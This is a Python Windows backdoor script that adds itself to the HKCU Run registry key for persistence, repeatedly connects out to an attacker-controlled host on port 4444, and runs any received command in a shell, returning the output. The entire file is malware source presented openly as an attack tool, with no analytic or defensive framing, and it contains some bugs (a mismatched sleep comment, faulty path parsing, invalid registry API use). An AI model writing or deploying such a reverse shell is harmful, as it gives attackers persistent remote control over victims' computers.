import socket
import subprocess
import ctypes
import os
import time


# Define the Windows API functions
def reg_open_key(key, subkey, access):
    reg_key = ctypes.c_void_p()
    result = ctypes.windll.advapi32.RegOpenKeyExW(key, subkey, 0, access, ctypes.byref(reg_key))
    if result != 0:
        raise Exception(f"Failed to open registry key, error code: {result}")
    return reg_key


def reg_set_value(key, value_name, value_type, value):
    result = ctypes.windll.advapi32.RegSetValueExW(key, value_name, 0, value_type, value, len(value))
    if result != 0:
        raise Exception(f"Failed to set registry value, error code: {result}")


def reg_create_key(key, subkey):
    reg_key = ctypes.c_void_p()
    result = ctypes.windll.advapi32.RegCreateKeyExW(key, subkey, 0, None, 0, 0xF003F, None, ctypes.byref(reg_key), None)
    if result != 0:
        raise Exception(f"Failed to create registry key, error code: {result}")
    return reg_key


def add_to_startup(script_path):
    # Add this script to the Windows startup registry
    try:
        key = reg_create_key(ctypes.windll.advapi32.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        reg_set_value(key, "MyScript", ctypes.c_wchar_p, script_path)
    except Exception as e:
        print(f"Failed to add to startup: {str(e)}")


def main():
    # Path to this script
    script_path = os.path.realpath(__file__)
    add_to_startup(script_path)

    # Create socket and continuously try to connect to the attacker's machine
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("IP", 4444))  # Replace with attacker's public IP and port
            break
        except socket.error:
            time.sleep(20)  # Wait for 10 seconds before retrying
            print("waiting for response")

    while True:
        try:
            # Receive command from attacker
            command = s.recv(1024).decode('utf-8')
            if not command:
                break

            # Execute command and send back output
            if command.startswith("cd "):
                try:
                    os.chdir(command.strip("cd "))
                    s.send(b"Changed directory")
                except FileNotFoundError as e:
                    s.send(f"Error: {str(e)}".encode())
            else:
                result = subprocess.run(command, shell=True, capture_output=True)
                s.send(result.stdout + result.stderr)

        except Exception as e:
            s.send(f"Error: {str(e)}".encode())

    s.close()


if __name__ == "__main__":
    main()
